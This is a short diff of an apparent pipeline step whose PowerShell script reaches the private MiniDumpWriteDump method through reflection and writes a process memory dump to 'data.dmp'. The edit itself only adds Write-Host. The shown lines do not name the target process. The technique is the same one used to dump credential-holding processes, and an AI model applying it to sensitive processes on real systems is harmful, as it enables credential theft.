@@ -26,7 +26,7 @@ steps:
       $outFile = "data.dmp";                    #Output file name
       
       $WERNativeType = [PSObject].Assembly.GetType("System.Management.Automation.WindowsErrorReporting+NativeMethods");
-      $WERNativeType
+      Write-Host $WERNativeType;
       $DumpMethodInfo = $WERNativeType.GetMethod('MiniDumpWriteDump', [Reflection.BindingFlags]'NonPublic,Static');
       
       $FileStream = New-Object IO.FileStream($outFile, [IO.FileMode]::Create);
